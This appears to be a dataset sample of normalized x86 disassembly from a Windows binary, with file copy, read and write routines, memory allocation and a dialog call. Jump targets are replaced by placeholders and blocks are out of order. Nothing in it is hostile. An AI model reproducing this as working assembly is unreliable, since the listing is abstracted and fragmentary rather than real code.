mov edx [ ebp + 0x14 ]
mov [ ebp - 0x6c ] eax
cmp [ rw-data ] edi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x70 ] edx
mov [ ebp - 0x68 ] edi
je r-xdata
lea eax [ ebp - 0x40 ]
cmp eax 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
cmp eax 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
cmp eax 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
cmp eax 0x10
mov eax [ ebp - 0x40 ]
mov [ ebp + 0xc ] edi
jae r-xdata
mov ecx [ ebp + 0x10 ]
push 0x0
push ecx
push esi
call [ CopyFileA@IAT ]
test eax eax
jne r-xdata
mov esi [ esi ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push esi
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov esi [ esi ]
cmp [ rw-data ] edi
je r-xdata
mov [ ebp - 0x74 ] esi
push 0x0
push ecx
mov ecx [ ebx + 0x44 ]
push ecx
push eax
call [ rw-data ]
test eax eax
jge r-xdata
lea eax [ ebp - 0x40 ]
mov edx [ ebx + 0x44 ]
push 0x0
lea ecx [ ebp + 0xc ]
push ecx
push edx
push eax
call [ rw-data ]
test eax eax
jge r-xdata
lea eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebx + 0x44 ]
push ecx
push edi
push edx
push edi
push edi
push edi
push eax
push edi
call sub_4b4050
add esp 0x28
cmp eax edi
mov [ ebp - 0x14 ] eax
je r-xdata
lea eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
push ecx
push edx
mov edx [ ebx + 0x44 ]
lea ecx [ ebp + 0xc ]
push ecx
push edi
push edx
push edi
push edi
push edi
push eax
push edi
call sub_4b4050
add esp 0x28
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x4c ]
mov esi 0x10
cmp eax esi
jb r-xdata
jmp r-xdata
lea ecx [ ebp - 0x64 ]
call sub_4480e0
lea ecx [ ebp - 0x44 ]
call sub_4480e0
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x20 ]
push edx
push 0x0
call [ LocalAlloc@IAT ]
test eax eax
mov [ edi ] eax
je r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
je r-xdata
or [ ebp - 0x74 ] 0x20
mov edx [ ebp + 0xc ]
mov eax [ edx ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
mov [ ebp - 0x14 ] 0xffffffff
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push edi
push 0x80
push 0x2
push edi
push edi
push 0x40000000
push esi
mov [ ebp - 0x14 ] 0xffffffff
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax edi
jmp r-xdata
cmp [ ebp - 0x2c ] esi
mov [ ebp - 0x4c ] 0xf
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] 0x0
jb r-xdata
mov ecx [ ebp - 0x60 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ ebp - 0x64 ]
call sub_4480e0
lea ecx [ ebp - 0x44 ]
call sub_4480e0
mov eax 0xfffffffe
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x20 ]
push 0x0
lea ecx [ ebp - 0x28 ]
push ecx
push edx
push eax
push esi
call [ ReadFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
test edi edi
jne r-xdata
mov eax [ ebp - 0x74 ]
or eax 0x10
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x74 ] eax
mov ecx [ ebx + 0x20 ]
push ecx
push edi
call [ LocalAlloc@IAT ]
cmp eax edi
mov [ esi ] eax
jne r-xdata
test eax eax
mov edx [ ebp + 0xc ]
push 0x0
lea ecx [ ebp - 0x48 ]
push ecx
push edx
call [ LocalSize@IAT ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov eax [ ebp + 0xc ]
cmp eax edi
je r-xdata
mov ecx [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x48 ]
push eax
push ecx
call [ LocalSize@IAT ]
mov edx [ ebp + 0xc ]
push eax
push edx
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x40 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push eax
call [ LocalFree@IAT ]
mov [ esi ] edi
jmp r-xdata
mov edi [ ebp - 0x20 ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp + 0x10 ] edi
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
jmp r-xdata
cmp [ ebp - 0x84 ] 0x10
jb r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov eax [ eax + 0x8c ]
cmp eax edi
je r-xdata
xor esi esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x84 ] 0xf
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x98 ] 0x0
test [ ebx + 0x1c ] 0x20000000
mov [ ebp - 0x4 ] 0x5
je r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x78 ] ecx
mov eax [ ebp - 0x98 ]
mov [ ebp - 0x78 ] eax
jmp r-xdata
cmp esi edi
je r-xdata
cmp [ eax + 0x34 ] 0x10
jb r-xdata
cmp [ eax + 0x34 ] 0x10
jb r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov [ eax ] edi
call [ rw-data ]
mov esi eax
test [ ebx + 0x1c ] 0x20000000
mov [ ebp - 0x14 ] esi
je r-xdata
inc [ edi + 0x4 ]
mov [ ebp - 0x24 ] 0x0
test edi edi
mov ecx [ ebx + 0x44 ]
lea edx [ ebp - 0x78 ]
push edx
lea eax [ ebp - 0x24 ]
push eax
push ecx
push ecx
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x28 ] esp
mov eax esp
je r-xdata
cmp [ esi + 0x37c ] 0x10
jb r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0xfffffff8
jne r-xdata
lea eax [ esi + 0x368 ]
mov eax [ esi + 0x368 ]
jmp r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x18 ] esi
push eax
lea edx [ ebp - 0x44 ]
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
mov ecx [ rw-data ]
mov esi [ ecx + 0x8c ]
mov [ ebp - 0x18 ] esi
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
mov [ ebp - 0x4 ] 0x5
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x4 ] 0x8
je r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov ecx rw-data
mov [ ebp - 0x28 ] rw-data
call sub_404310
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
mov [ ebp - 0x4 ] 0x7
jae r-xdata
push eax
lea ecx [ ebp - 0x9c ]
call sub_402510
mov eax [ ebp - 0x14 ]
test eax eax
jge r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov ebx [ ebx + 0x24 ]
mov ecx [ ebp + 0x10 ]
push 0x6
push ebx
push eax
push 0x0
push 0x0
push ecx
mov [ ebp - 0x80 ] eax
call sub_41c070
add esp 0x18
test eax eax
je r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call [ edx + 0x18 ]
push 0xffffffff
mov ecx eax
push 0x0
lea eax [ ebp - 0x9c ]
add ecx 0x364
push eax
call sub_401dd0
mov edx [ rw-data ]
push edx
push eax
mov eax [ rw-data ]
push eax
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
mov eax rw-data
cmp [ ebp - 0x84 ] 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x80 ]
xor edi edi
push edi
mov esi 0x1000
push esi
push ebx
push edx
mov [ ebp - 0x4 ] 0x9
mov [ ebp - 0xa0 ] edi
call sub_4b61c0
test eax eax
mov [ ebp - 0x28 ] eax
jne r-xdata
inc [ eax + 0x4 ]
mov ecx rw-data
call sub_401420
mov eax [ ebp - 0x24 ]
test eax eax
mov [ ebp - 0x4 ] 0x5
je r-xdata
mov eax [ rw-data ]
lea ecx [ ebp - 0x9c ]
push ecx
push sub_4025c0
push eax
push 0xc20
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x20 ]
test eax eax
mov [ ebp - 0x84 ] 0xf
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x98 ] 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp - 0x98 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi eax
mov eax [ esi ]
push eax
call [ LocalFree@IAT ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xa0 ]
mov [ ebp - 0x1c ] 0x0
lea esp [ esp ]
mov [ ebp - 0x28 ] 0x1
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
push 0xffffffff
push 0x0
push rw-data
mov ecx rw-data
call sub_401dd0
mov ecx rw-data
call sub_401420
mov eax [ ebp - 0x24 ]
test eax eax
mov [ ebp - 0x4 ] 0x5
je r-xdata
mov ecx rw-data
call sub_401420
mov eax [ ebp - 0x24 ]
test eax eax
mov [ ebp - 0x4 ] 0x5
je r-xdata
dec [ eax + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
mov [ ebp - 0x4 ] 0x8
je r-xdata
jl r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
jmp r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov ecx eax
mov edx [ ecx ]
push 0x1
call [ edx ]
dec [ eax + 0x4 ]
jne r-xdata
mov eax esi
cdq
add eax edi
adc edx ecx
cmp edx ebx
jl r-xdata
cmp edi [ ebp - 0x80 ]
jae r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
jmp r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
jmp r-xdata
mov ecx eax
mov edx [ ecx ]
push 0x1
call [ edx ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
test eax eax
je r-xdata
jg r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
push esi
lea eax [ ebp - 0x10a4 ]
push eax
call [ edx + 0x18 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ecx ]
push esi
lea eax [ ebp - 0x10a4 ]
push eax
call [ edx + 0x1c ]
mov ecx [ ebp - 0xa0 ]
mov eax esi
cdq
add edi eax
mov eax [ ebp - 0x1c ]
adc ecx edx
inc eax
mov [ ebp - 0xa0 ] ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x1c ]
push edx
push ecx
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x80 ]
sub esi edi
cmp eax [ ebp - 0x80 ]
jbe r-xdata
cmp ecx ebx
jg r-xdata
mov [ ebp - 0x14 ] 0x40
sub_405ce0
sub esp 0x18
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov edx [ esp + 0x1c ]
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
lea ecx [ esp ]
mov [ esp + 0x8 ] eax
xor eax eax
push ecx
push edx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
call [ rw-data ]
xor ecx ecx
test eax eax
setge cl
mov eax ecx
add esp 0x18
retn
add esp 0x18
retn
sub_405d40
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ esp + 0x20 ]
fld [ esp + 0xc ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push 0x0
push eax
mov eax [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push ecx
sub esp 0x8
fstp [ esp ]
push edx
push eax
call [ rw-data ]
test eax eax
jge r-xdata
xor ecx ecx
test eax eax
setg cl
inc ecx
mov eax ecx
retn
sub_405da0
push ecx
push 0x1
mov [ esp + 0x4 ] r--data
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp ]
pop ecx
retn
mov ecx [ esp + 0x8 ]
lea eax [ esp ]
push eax
push ecx
call [ rw-data ]
sub_405dd0
sub esp 0x28
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x34 ]
xor eax eax
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x38 ]
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
lea eax [ esp ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x2c ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x3c ]
push eax
push ecx
mov [ esp + 0x10 ] 0x20
mov [ esp + 0x14 ] edx
call [ rw-data ]
neg eax
sbb eax eax
inc eax
add esp 0x28
retn
add esp 0x28
retn
sub_405e40
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ rw-data ]
xor ecx ecx
test eax eax
setge cl
mov eax ecx
retn
retn
sub_405e70
sub esp 0x20
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] ecx
mov cl [ esp + 0x38 ]
xor edx edx
cmp cl al
mov ecx [ esp + 0x2c ]
sete dl
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
lea eax [ esp ]
push eax
mov eax [ esp + 0x28 ]
lea edx [ edx + edx + 0x1 ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x2c ]
push ecx
push edx
push eax
mov [ esp + 0x1c ] 0x8
call [ rw-data ]
neg eax
sbb eax eax
inc eax
add esp 0x20
retn
add esp 0x20
retn
sub_405ef0
push 0x1
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ rw-data ]
neg eax
sbb eax eax
inc eax
retn
retn
sub_405f20
push 0xffffffff
push sub_4beab8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push 0x3
mov [ esp + 0x14 ] 0x0
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
push ecx
mov [ esp + 0x8 ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
mov [ esp + 0x10 ] 0xffffffff
je r-xdata
mov [ eax ] esi
call [ rw-data ]
test eax eax
mov [ esp + 0x10 ] 0xffffffff
jl r-xdata
inc [ esi + 0x4 ]
mov ecx [ esp + 0x8 ]
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x10
retn
dec [ ecx + 0x4 ]
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax [ ecx ]
jmp r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x10
retn
dec [ esi + 0x4 ]
jne r-xdata
push 0x1
call [ eax ]
mov eax [ esi ]
mov ecx esi
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
sub_405fe0
push 0xffffffff
push sub_4beab8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push 0x3
mov [ esp + 0x14 ] 0x0
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
push ecx
mov [ esp + 0x8 ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
mov [ esp + 0x10 ] 0xffffffff
je r-xdata
mov [ eax ] esi
call [ rw-data ]
test eax eax
mov [ esp + 0x10 ] 0xffffffff
jl r-xdata
inc [ esi + 0x4 ]
mov ecx [ esp + 0x8 ]
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x10
retn
dec [ ecx + 0x4 ]
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax [ ecx ]
jmp r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x10
retn
dec [ esi + 0x4 ]
jne r-xdata
push 0x1
call [ eax ]
mov eax [ esi ]
mov ecx esi
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
sub_4060a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bea60
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0x3
mov [ ebp - 0x4 ] ebx
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push 0x1
push ebx
push ecx
push ebx
push edx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_41c070
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov edx [ ebp + 0x24 ]
mov edi [ ebp + 0x28 ]
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x38 ] edx
xor edx edx
cmp edi ebx
setne dl
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x40 ]
dec edx
and edx 0x8
cmp esi ebx
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x30 ]
push eax
mov [ ebp - 0x40 ] edx
mov edx [ ebp + 0x34 ]
push ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
inc [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp edi ebx
push ecx
mov [ eax ] esi
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] edi
call [ rw-data ]
cmp eax ebx
mov [ ebp - 0x4 ] bl
jne r-xdata
inc [ edi + 0x4 ]
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
cmp edi ebx
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
dec [ esi + 0x4 ]
jne r-xdata
cmp edi ebx
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
dec [ esi + 0x4 ]
jne r-xdata
dec [ edi + 0x4 ]
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ edi + 0x4 ]
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax ]
sub_406260
push 0xffffffff
push sub_4bea80
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ esp + 0x3c ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x30 ] ebx
je r-xdata
mov ecx [ esp + 0x38 ]
cmp ecx ebx
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov esi 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
lea ecx [ esp + 0xc ]
push ecx
push eax
mov [ esp + 0x38 ] 0x1
call sub_4a4e90
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x28
retn
dec [ ecx + 0x4 ]
jne r-xdata
push 0x3
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
xor eax eax
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x28
retn
mov esi [ esp + 0x38 ]
cmp esi ebx
push ecx
mov [ esp + 0x40 ] esp
mov eax esp
je r-xdata
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
mov edx [ esp + 0x10 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov [ eax ] esi
call [ rw-data ]
mov edi eax
cmp edi ebx
jne r-xdata
inc [ esi + 0x4 ]
mov ecx [ esp + 0x38 ]
cmp ecx ebx
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp esi ebx
push ecx
mov [ esp + 0x40 ] esp
mov eax esp
je r-xdata
cmp [ esp + 0x24 ] 0x10
mov eax [ esp + 0x10 ]
jae r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov [ eax ] esi
call [ rw-data ]
lea ecx [ esp + 0xc ]
call sub_4480e0
cmp edi ebx
mov [ esp + 0x30 ] 0xffffffff
jne r-xdata
inc [ esi + 0x4 ]
cmp esi ebx
push eax
push ecx
mov [ esp + 0x44 ] esp
mov eax esp
je r-xdata
lea eax [ esp + 0x10 ]
mov edx [ ecx ]
jmp r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov [ eax ] esi
call [ rw-data ]
mov edi eax
inc [ esi + 0x4 ]
push 0x1
call [ edx ]
dec [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x28
retn
dec [ esi + 0x4 ]
jne r-xdata
mov edx [ esi ]
mov ecx esi
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
sub_406420
push ebp
mov ebp esp
push 0xffffffff
push sub_4bea98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x34 ] 0x10
jb r-xdata
lea esi [ ebx + 0x20 ]
mov esi [ ebx + 0x20 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push esi
call sub_401e80
call sub_401530
add esp 0x1c
cmp eax 0x3
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
mov eax esi
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
xor edi edi
mov [ ebp - 0x14 ] edi
cmp [ ebx + 0x34 ] 0x10
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
jb r-xdata
lea eax [ ebx + 0x20 ]
mov eax [ ebx + 0x20 ]
jmp r-xdata
push 0x3
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] edi
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
inc [ esi + 0x4 ]
push 0x1
push edi
push edi
push edi
push edi
push eax
call sub_41c070
mov esi eax
add esp 0x18
cmp esi edi
je r-xdata
cmp esi edi
lea ecx [ ebp + 0x8 ]
push ecx
push ecx
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
cmp esi edi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov [ eax ] esi
call [ rw-data ]
cmp eax edi
je r-xdata
inc [ esi + 0x4 ]
dec [ esi + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push ebx
call sub_4a7d40
mov ecx [ ebp + 0x8 ]
add esp 0x8
push ecx
mov edi eax
call [ LocalFree@IAT ]
test esi esi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
cmp esi edi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0x4 ]
jne r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4065a0
push 0xffffffff
push sub_4beab8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
mov al [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push 0x2
mov [ esp + 0x20 ] 0x0
mov [ esp + 0xc ] al
mov [ esp + 0x8 ] ecx
mov [ esp + 0x10 ] 0x0
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x24 ]
test esi esi
lea eax [ esp + 0x4 ]
push eax
push ecx
mov [ esp + 0x34 ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x24 ]
test ecx ecx
mov [ esp + 0x1c ] 0xffffffff
je r-xdata
mov [ eax ] esi
call [ rw-data ]
test eax eax
mov [ esp + 0x1c ] 0xffffffff
jl r-xdata
inc [ esi + 0x4 ]
mov ecx [ esp + 0x14 ]
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x1c
retn
dec [ ecx + 0x4 ]
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
xor eax eax
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x1c
